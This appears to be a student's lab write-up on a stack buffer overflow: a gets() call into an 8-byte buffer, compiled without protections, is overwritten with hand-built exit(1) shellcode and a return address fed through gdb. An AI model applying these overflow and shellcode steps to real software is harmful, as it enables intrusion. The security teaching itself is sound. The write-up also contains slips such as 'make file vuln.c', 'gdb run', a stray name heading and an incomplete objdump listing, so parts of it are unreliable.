## 0. Intuition

The goal of this machine problem is to exploit a buffer overflow vulnerability in a given C program to forcefully exit with a return code of 1. The program vuln.c contains a function vulnc() that reads user input into a fixed-size buffer (char buffer\[8];) without bounds checking using gets(buffer);. This allows an attacker to overwrite adjacent memory, including the saved instruction pointer (EIP), to hijack execution flow and inject malicious shellcode.

***

## 1. Compiling Ellenmarie Frances Puyot

### Creating the Vulnerable File

Create the file `vuln.c`:

```bash
> make file vuln.c
```

**vuln.c**

```c
#include <stdio.h>

void vuln() {
    char buffer[8]; 
    gets(buffer); 
} 

int main() { 
    vuln(); 
    while (1) { }
}
```

### Compiling the Vulnerable Program

Compile using the following command:

```bash
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
```

**Explanation of the flags:**

* **-m32:** Compile for 32-bit architecture.
* **-fno-stack-protector:** Disables stack protection (no canary values).
* **-mpreferred-stack-boundary=2:** Forces a 4-byte aligned stack.
* **-fno-pie:** Creates a non-position-independent executable.
* **-ggdb:** Includes debugging symbols.
* **-z execstack:** Allows execution of code on the stack.

## 3. Obtaining Machine Code

### Creating the Assembly File

Create a file `asm.c` with the following original content:

```c
int main() {
    __asm__("xor %eax, %eax;"
            "inc %eax;"
            "mov %ebx, %eax;"
            "leave;"
            "ret;"
    );
}
```

Compile the assembly program:

```bash
$ gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm
```

Obtain the machine code using the `objdump` tool:

```bash
$ objdump -d asm > asmdump
```

### Original asmdump Output

```asm

    118d:    55               push   %ebp
    118e:    89 e5            mov    %esp,%ebp
    1190:    31 c0            xor    %eax,%eax

    1193:    89 c3            mov    %eax,%ebx
    1195:    c9               leave
    1196:    c3               ret
    1197:    b8 00 00 00 00   mov    $0x0,%eax
```

## Before Writing Down the Shellcode

Before capturing the shellcode, the assembly in `asm.c` needed to be modified so that instead of executing `leave` and `ret`, it invokes a system call using `int 0x80`.

### Modified `asm.c`

```c
// asm.c
int main() {
    __asm__("xor %eax, %eax;"
            "inc %eax;"
            "mov %ebx, %eax;"
            "int 0x80;"
    );
}
```

### Modified asmdump Output

```asm
0000118d <main>:
    118d:    55               push   %ebp
    118e:    89 e5            mov    %esp,%ebp
    1190:    31 c0            xor    %eax,%eax
    1192:    40               inc    %eax
    1193:    89 c3            mov    %eax,%ebx
    1195:    cd 80            int    $0x80
    1197:    b8 00 00 00 00   mov    $0x0,%eax
    119c:    5d               pop    %ebp
    119d:    c3               ret
```

***

## 4. Writing Down the Shellcode

Write the shellcode (machine code bytes) into a file named `egg`:

```bash
> echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > egg
```

*This command writes the specified bytes without adding a newline, preparing them for injection.*

***

## 5. Running the Program in GDB

Run the vulnerable program in GDB and feed the shellcode:

```bash
> gdb run
> run < egg
```
